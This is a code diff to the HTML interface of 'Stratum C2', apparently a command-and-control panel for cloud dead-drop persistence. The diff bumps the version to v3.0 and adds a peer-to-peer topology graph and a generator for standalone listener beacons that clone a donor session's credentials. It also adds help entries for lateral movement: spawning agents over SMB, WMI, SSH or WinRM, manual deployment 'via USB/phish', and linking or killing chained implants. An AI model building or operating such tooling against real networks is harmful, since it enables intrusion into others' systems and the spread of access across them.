@@ -37,7 +37,7 @@
       </div>
       <div class="login-error" id="login-error"></div>
       <div class="login-footer">
-        <span id="login-version">Stratum C2 v2.0</span>
+        <span id="login-version">Stratum C2 v3.0</span>
       </div>
     </div>
   </div>
@@ -56,6 +56,7 @@
     <div class="tb-actions">
       <button class="btn-sm" id="btn-deploy">+ Deploy</button>
       <button class="btn-sm" id="btn-tradecraft" title="Browse deployment packages">📦 Tradecraft</button>
+      <button class="btn-sm" id="btn-graph-toggle" title="Toggle P2P topology graph">🔗 Graph</button>
     </div>
     <div class="tb-sep"></div>
     <div class="tb-stats">
@@ -166,6 +167,7 @@
           <span class="version-warn" id="version-mismatch-warn" style="display:none" title="">⚠ Agent outdated</span>
           <button class="btn-lock-toggle unlocked" id="btn-lock-toggle" title="Lock session — prevent kill/stop/delete">🔓 Lock</button>
           <button class="btn-poll-toggle stopping" id="btn-poll-toggle" title="Stop Dropbox polling for this session">■ Stop Poll</button>
+          <button class="btn-gen-listener" id="btn-gen-listener" title="Generate a standalone P2P listener beacon using this session as donor">⇢ P2P Listener</button>
         </div>
         <div class="sh-r2" id="sh-meta"></div>
       </div>
@@ -325,6 +327,24 @@
     </div>
 
   </div><!-- /lower -->
+
+  <!-- P2P topology graph (toggled with Graph button) -->
+  <div id="graph-container" style="display:none">
+    <div class="graph-legend">
+      <div class="gl-row"><span class="gl-dot gl-alive"></span> Alive</div>
+      <div class="gl-row"><span class="gl-dot gl-idle"></span> Idle</div>
+      <div class="gl-row"><span class="gl-dot gl-dead"></span> Dead</div>
+      <div class="gl-row"><span class="gl-dot gl-admin"></span> Admin / SYSTEM</div>
+      <div class="gl-row"><span class="gl-line gl-tcp"></span> TCP</div>
+      <div class="gl-row"><span class="gl-line gl-smb"></span> SMB</div>
+      <div class="gl-row"><span class="gl-line gl-cloud"></span> Cloud</div>
+    </div>
+    <div class="graph-empty" id="graph-empty">
+      <div class="em-icon">🔗</div>
+      <p>No P2P links established</p>
+    </div>
+  </div>
+
 </div><!-- /app-view -->
 
 <!-- ══════════════════════════════════════ MODALS ═══════════════════════════ -->
@@ -403,6 +423,43 @@
     </div>
     <div class="modal-footer" id="wipe-progress-footer" style="display:none">
       <button class="btn-primary" id="wipe-progress-close">Close</button>
+    </div>
+  </div>
+</div>
+
+<!-- P2P Listener Generator -->
+<div class="modal-overlay" id="p2p-gen-modal">
+  <div class="modal modal-sm">
+    <div class="modal-header">
+      <span class="modal-title">Generate P2P Listener</span>
+      <button class="modal-close" onclick="Modal.close('p2p-gen-modal')">×</button>
+    </div>
+    <div class="modal-body" style="padding:.9rem 1.1rem">
+      <div class="cred-form-grid">
+        <label>Platform</label>
+        <select id="p2p-f-platform">
+          <option value="linux">Linux</option>
+          <option value="windows">Windows</option>
+        </select>
+        <label>Bind Type</label>
+        <select id="p2p-f-bind-type">
+          <option value="tcp">TCP</option>
+          <option value="smb">SMB (Named Pipe)</option>
+        </select>
+        <label id="p2p-lbl-iface">Interface</label>
+        <input id="p2p-f-iface" value="0.0.0.0" placeholder="0.0.0.0">
+        <label id="p2p-lbl-port">Port</label>
+        <input id="p2p-f-port" type="number" placeholder="random (4444-5443)" min="1" max="65535">
+        <label id="p2p-lbl-pipe" style="display:none">Pipe Name</label>
+        <input id="p2p-f-pipe" placeholder="empty = random" style="display:none">
+        <label>Label</label>
+        <input id="p2p-f-label" placeholder="optional">
+      </div>
+      <p class="text-dim" style="font-size:.68rem;margin:.6rem 0 0">Donor session credentials will be cloned into the new beacon.</p>
+    </div>
+    <div class="modal-footer">
+      <button class="btn-sm btn-sm-ghost" onclick="Modal.close('p2p-gen-modal')">Cancel</button>
+      <button class="btn-sm btn-sm-accent" id="p2p-gen-go">Generate</button>
     </div>
   </div>
 </div>
@@ -658,6 +715,18 @@
       </div>
 
       <div class="help-block" style="margin-top:.75rem">
+        <div class="help-block-title">Lateral Movement — P2P Mesh</div>
+        <div class="help-cmd-grid">
+          <div class="help-cmd-row"><code>/jump &lt;mod&gt; &lt;target&gt; [opts]</code><span>Spawn P2P child via SMB/WMI/SSH/WinRM — builds &amp; deploys agent</span></div>
+          <div class="help-cmd-row"><code>/generate-listener [tcp|smb] [linux|windows]</code><span>Build standalone P2P listener beacon (manual deploy via USB/phish)</span></div>
+          <div class="help-cmd-row"><code>/p2p link tcp &lt;host:port&gt;</code><span>Connect to a P2P child listening on TCP</span></div>
+          <div class="help-cmd-row"><code>/p2p link smb &lt;target-ip&gt; [pipe-name]</code><span>Connect to a P2P child listening on SMB named pipe (port 445, default pipe: stratum)</span></div>
+          <div class="help-cmd-row"><code>/p2p unlink &lt;guid&gt;</code><span>Disconnect a linked P2P child</span></div>
+          <div class="help-cmd-row"><code>/kill-cascade</code><span>Kill session and all P2P descendants — leaf-first propagation</span></div>
+        </div>
+      </div>
+
+      <div class="help-block" style="margin-top:.75rem">
         <div class="help-block-title">Session Control</div>
         <div class="help-cmd-grid">
           <div class="help-cmd-row"><code>/kill</code><span>Wipe agent files on target and terminate process</span></div>
@@ -900,7 +969,7 @@
       <div class="about-hero">
         <div class="about-logo-wrap"><img src="/assets/icon.webp" alt="Stratum C2"></div>
         <div class="about-name">Stratum C2</div>
-        <div class="about-ver" id="about-version">v2.0 — Cloud Persistence Framework</div>
+        <div class="about-ver" id="about-version">v3.0 — Cloud Persistence Framework</div>
       </div>
       <div class="about-desc">
         Dead-drop C2 channel via cloud storage providers.<br>
@@ -1128,6 +1197,7 @@
 <script src="/js/tradecraft.js"></script>
 <script src="/js/notif.js"></script>
 <script src="/js/contextmenu.js"></script>
+<script src="/js/graph.js"></script>
 <script src="/js/app.js"></script>
 
 </body>
